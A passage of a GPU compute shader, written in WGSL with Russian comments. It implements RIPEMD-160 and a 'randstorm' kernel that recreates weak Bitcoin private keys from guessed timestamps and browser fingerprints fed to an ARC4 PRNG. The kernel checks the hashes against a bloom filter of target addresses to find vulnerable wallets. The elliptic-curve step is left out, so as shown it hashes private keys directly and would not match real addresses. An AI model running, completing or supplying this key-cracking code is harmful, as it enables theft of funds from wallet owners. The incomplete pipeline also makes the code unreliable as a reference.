        case 20u: { return  0u; } case 21u: { return 13u; } case 22u: { return  5u; } case 23u: { return 10u; }
        case 24u: { return 14u; } case 25u: { return 15u; } case 26u: { return  8u; } case 27u: { return 12u; }
        case 28u: { return  4u; } case 29u: { return  9u; } case 30u: { return  1u; } case 31u: { return  2u; }
        case 32u: { return 15u; } case 33u: { return  5u; } case 34u: { return  1u; } case 35u: { return  3u; }
        case 36u: { return  7u; } case 37u: { return 14u; } case 38u: { return  6u; } case 39u: { return  9u; }
        case 40u: { return 11u; } case 41u: { return  8u; } case 42u: { return 12u; } case 43u: { return  2u; }
        case 44u: { return 10u; } case 45u: { return  0u; } case 46u: { return  4u; } case 47u: { return 13u; }
        case 48u: { return  8u; } case 49u: { return  6u; } case 50u: { return  4u; } case 51u: { return  1u; }
        case 52u: { return  3u; } case 53u: { return 11u; } case 54u: { return 15u; } case 55u: { return  0u; }
        case 56u: { return  5u; } case 57u: { return 12u; } case 58u: { return  2u; } case 59u: { return 13u; }
        case 60u: { return  9u; } case 61u: { return  7u; } case 62u: { return 10u; } case 63u: { return 14u; }
        case 64u: { return 12u; } case 65u: { return 15u; } case 66u: { return 10u; } case 67u: { return  4u; }
        case 68u: { return  1u; } case 69u: { return  5u; } case 70u: { return  8u; } case 71u: { return  7u; }
        case 72u: { return  6u; } case 73u: { return  2u; } case 74u: { return 13u; } case 75u: { return 14u; }
        case 76u: { return  0u; } case 77u: { return  3u; } case 78u: { return  9u; } case 79u: { return 11u; }
        default:  { return  0u; }
    }
}
fn rmd_s1(j: u32) -> u32 {
    switch j {
        case  0u:{return 11u;} case  1u:{return 14u;} case  2u:{return 15u;} case  3u:{return 12u;}
        case  4u:{return  5u;} case  5u:{return  8u;} case  6u:{return  7u;} case  7u:{return  9u;}
        case  8u:{return 11u;} case  9u:{return 13u;} case 10u:{return 14u;} case 11u:{return 15u;}
        case 12u:{return  6u;} case 13u:{return  7u;} case 14u:{return  9u;} case 15u:{return  8u;}
        case 16u:{return  7u;} case 17u:{return  6u;} case 18u:{return  8u;} case 19u:{return 13u;}
        case 20u:{return 11u;} case 21u:{return  9u;} case 22u:{return  7u;} case 23u:{return 15u;}
        case 24u:{return  7u;} case 25u:{return 12u;} case 26u:{return 15u;} case 27u:{return  9u;}
        case 28u:{return 11u;} case 29u:{return  7u;} case 30u:{return 13u;} case 31u:{return 12u;}
        case 32u:{return 11u;} case 33u:{return 13u;} case 34u:{return  6u;} case 35u:{return  7u;}
        case 36u:{return 14u;} case 37u:{return  9u;} case 38u:{return 13u;} case 39u:{return 15u;}
        case 40u:{return 14u;} case 41u:{return  8u;} case 42u:{return 13u;} case 43u:{return  6u;}
        case 44u:{return  5u;} case 45u:{return 12u;} case 46u:{return  7u;} case 47u:{return  5u;}
        case 48u:{return 11u;} case 49u:{return 12u;} case 50u:{return 14u;} case 51u:{return 15u;}
        case 52u:{return 14u;} case 53u:{return 15u;} case 54u:{return  9u;} case 55u:{return  8u;}
        case 56u:{return  9u;} case 57u:{return 14u;} case 58u:{return  5u;} case 59u:{return  6u;}
        case 60u:{return  8u;} case 61u:{return  6u;} case 62u:{return  5u;} case 63u:{return 12u;}
        case 64u:{return  9u;} case 65u:{return 15u;} case 66u:{return  5u;} case 67u:{return 11u;}
        case 68u:{return  6u;} case 69u:{return  8u;} case 70u:{return 13u;} case 71u:{return 12u;}
        case 72u:{return  5u;} case 73u:{return 12u;} case 74u:{return 13u;} case 75u:{return 14u;}
        case 76u:{return 11u;} case 77u:{return  8u;} case 78u:{return  5u;} case 79u:{return  6u;}
        default: {return  8u;}
    }
}
fn rmd_s2(j: u32) -> u32 {
    switch j {
        case  0u:{return  8u;} case  1u:{return  9u;} case  2u:{return  9u;} case  3u:{return 11u;}
        case  4u:{return 13u;} case  5u:{return 15u;} case  6u:{return 15u;} case  7u:{return  5u;}
        case  8u:{return  7u;} case  9u:{return  7u;} case 10u:{return  8u;} case 11u:{return 11u;}
        case 12u:{return 14u;} case 13u:{return 14u;} case 14u:{return 12u;} case 15u:{return  6u;}
        case 16u:{return  9u;} case 17u:{return 13u;} case 18u:{return 15u;} case 19u:{return  7u;}
        case 20u:{return 12u;} case 21u:{return  8u;} case 22u:{return  9u;} case 23u:{return 11u;}
        case 24u:{return  7u;} case 25u:{return  7u;} case 26u:{return 12u;} case 27u:{return  7u;}
        case 28u:{return  6u;} case 29u:{return 15u;} case 30u:{return 13u;} case 31u:{return 11u;}
        case 32u:{return  9u;} case 33u:{return  7u;} case 34u:{return 15u;} case 35u:{return 11u;}
        case 36u:{return  8u;} case 37u:{return  6u;} case 38u:{return  6u;} case 39u:{return 14u;}
        case 40u:{return 12u;} case 41u:{return 13u;} case 42u:{return  5u;} case 43u:{return 14u;}
        case 44u:{return 13u;} case 45u:{return 13u;} case 46u:{return  7u;} case 47u:{return  5u;}
        case 48u:{return 15u;} case 49u:{return  5u;} case 50u:{return  8u;} case 51u:{return 11u;}
        case 52u:{return 14u;} case 53u:{return 14u;} case 54u:{return  6u;} case 55u:{return 14u;}
        case 56u:{return  6u;} case 57u:{return  9u;} case 58u:{return 12u;} case 59u:{return  9u;}
        case 60u:{return 12u;} case 61u:{return  5u;} case 62u:{return 15u;} case 63u:{return  8u;}
        case 64u:{return  8u;} case 65u:{return  5u;} case 66u:{return 12u;} case 67u:{return  9u;}
        case 68u:{return 12u;} case 69u:{return  5u;} case 70u:{return 14u;} case 71u:{return  6u;}
        case 72u:{return  8u;} case 73u:{return 13u;} case 74u:{return  6u;} case 75u:{return  5u;}
        case 76u:{return 15u;} case 77u:{return 13u;} case 78u:{return 11u;} case 79u:{return 11u;}
        default: {return  8u;}
    }
}

fn rmd_word(x0:u32,x1:u32,x2:u32,x3:u32,x4:u32,x5:u32,x6:u32,x7:u32,
            x8:u32,x9:u32,xa:u32,xb:u32,xc:u32,xd:u32,xe:u32,xf:u32, idx:u32) -> u32 {
    switch idx {
        case  0u:{return x0;} case  1u:{return x1;} case  2u:{return x2;} case  3u:{return x3;}
        case  4u:{return x4;} case  5u:{return x5;} case  6u:{return x6;} case  7u:{return x7;}
        case  8u:{return x8;} case  9u:{return x9;} case 10u:{return xa;} case 11u:{return xb;}
        case 12u:{return xc;} case 13u:{return xd;} case 14u:{return xe;} case 15u:{return xf;}
        default: {return 0u;}
    }
}

fn ripemd160_32(sha_out: array<u32, 8>) -> array<u32, 5> {
    // SHA-256 output (big-endian u32) → RIPEMD-160 input (little-endian u32)
    let x0  = ((sha_out[0]&0xFFu)<<24u)|((sha_out[0]>>8u&0xFFu)<<16u)|((sha_out[0]>>16u&0xFFu)<<8u)|(sha_out[0]>>24u);
    let x1  = ((sha_out[1]&0xFFu)<<24u)|((sha_out[1]>>8u&0xFFu)<<16u)|((sha_out[1]>>16u&0xFFu)<<8u)|(sha_out[1]>>24u);
    let x2  = ((sha_out[2]&0xFFu)<<24u)|((sha_out[2]>>8u&0xFFu)<<16u)|((sha_out[2]>>16u&0xFFu)<<8u)|(sha_out[2]>>24u);
    let x3  = ((sha_out[3]&0xFFu)<<24u)|((sha_out[3]>>8u&0xFFu)<<16u)|((sha_out[3]>>16u&0xFFu)<<8u)|(sha_out[3]>>24u);
    let x4  = ((sha_out[4]&0xFFu)<<24u)|((sha_out[4]>>8u&0xFFu)<<16u)|((sha_out[4]>>16u&0xFFu)<<8u)|(sha_out[4]>>24u);
    let x5  = ((sha_out[5]&0xFFu)<<24u)|((sha_out[5]>>8u&0xFFu)<<16u)|((sha_out[5]>>16u&0xFFu)<<8u)|(sha_out[5]>>24u);
    let x6  = ((sha_out[6]&0xFFu)<<24u)|((sha_out[6]>>8u&0xFFu)<<16u)|((sha_out[6]>>16u&0xFFu)<<8u)|(sha_out[6]>>24u);
    let x7  = ((sha_out[7]&0xFFu)<<24u)|((sha_out[7]>>8u&0xFFu)<<16u)|((sha_out[7]>>16u&0xFFu)<<8u)|(sha_out[7]>>24u);
    // padding: 32 bytes → 1 block (64 bytes)
    let x8  = 0x00000080u;
    let x9  = 0u; let xa = 0u; let xb = 0u; let xc = 0u; let xd = 0u;
    let xe  = 0x00000100u;  // 256 bits
    let xf  = 0u;

    var a1=0x67452301u; var b1=0xefcdab89u; var c1=0x98badcfeu; var d1=0x10325476u; var e1=0xc3d2e1f0u;
    var a2=0x67452301u; var b2=0xefcdab89u; var c2=0x98badcfeu; var d2=0x10325476u; var e2=0xc3d2e1f0u;

    for (var j=0u; j<80u; j++) {
        let w1 = rmd_word(x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,xa,xb,xc,xd,xe,xf, rmd_r1(j));
        let w2 = rmd_word(x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,xa,xb,xc,xd,xe,xf, rmd_r2(j));
        let s1v = rmd_s1(j); let s2v = rmd_s2(j);
        let T1 = (a1 + rmd_f(j,b1,c1,d1) + w1 + rmd_k1(j));
        let rot1 = (T1 << s1v) | (T1 >> (32u - s1v));
        a1 = e1; e1 = d1; d1 = (c1<<10u)|(c1>>22u); c1 = b1; b1 = rot1 + e1;
        let T2 = (a2 + rmd_f(79u-j,b2,c2,d2) + w2 + rmd_k2(j));
        let rot2 = (T2 << s2v) | (T2 >> (32u - s2v));
        a2 = e2; e2 = d2; d2 = (c2<<10u)|(c2>>22u); c2 = b2; b2 = rot2 + e2;
    }

    var h: array<u32, 5>;
    let tmp = 0x98badcfeu + d1 + e2;
    h[0] = 0x10325476u + e1 + a2;
    h[1] = 0xc3d2e1f0u + a1 + b2;
    h[2] = 0x67452301u + b1 + c2;
    h[3] = 0xefcdab89u + c1 + d2;
    h[4] = tmp;
    return h;
}

// ── secp256k1 scalar → compressed pubkey 33 bytes ───────────
// (Упрощённая double-and-add с константной точкой G)
// NOTE: Полная реализация EC умножения здесь опущена для краткости —
//       заменяется вашей существующей ec_mul_G функцией из предыдущего шейдера.
// Подключить: fn privkey_to_hash160(key: array<u32,32>) -> array<u32,5>
// используя существующий scalar_mult_G + serialize_compressed + sha256 + ripemd160

// ── Главный kernel ───────────────────────────────────────────
@compute @workgroup_size(64, 1, 1)
fn randstorm_main(@builtin(global_invocation_id) gid: vec3<u32>) {
    let ts_idx = gid.x;
    let fp_idx = gid.y;

    if fp_idx >= params.fp_count { return; }

    // Вычисляем timestamp
    let ts_lo = params.start_ms_lo + ts_idx * params.interval_ms;
    let ts_hi = params.start_ms_hi + select(0u, 1u, ts_lo < params.start_ms_lo);

    // Загружаем fingerprint
    let fp = fingerprints[fp_idx];

    // ARC4 KSA с fingerprint
    var s: array<u32, 256>;
    arc4_ksa(ts_lo, ts_hi, fp.screen_width, fp.screen_height,
             fp.color_depth, fp.timezone_offset, gid.x, &s);

    // Генерируем 32 байта приватного ключа
    var prng_out: array<u32, 32>;
    arc4_prng(&s, &prng_out);

    // Вычисляем Hash160 (здесь — через sha256 → ripemd160)
    // В реальном коде: privkey → pubkey (EC) → sha256 → ripemd160
    let sha_out = sha256_32(prng_out);
    let h160    = ripemd160_32(sha_out);

    // Проверяем bloom filter
    if !bloom_check(h160[0], h160[1], h160[2], h160[3], h160[4]) { return; }

    // Записываем результат
    let idx = atomicAdd(&result_count[0], 1u);
    if idx < 65536u {
        results[idx].timestamp_lo = ts_lo;
        results[idx].timestamp_hi = ts_hi;
        results[idx].fp_index     = fp_idx;
        results[idx].address[0]   = h160[0];
        results[idx].address[1]   = h160[1];
        results[idx].address[2]   = h160[2];
        results[idx].address[3]   = h160[3];
        results[idx].address[4]   = h160[4];
    }
}
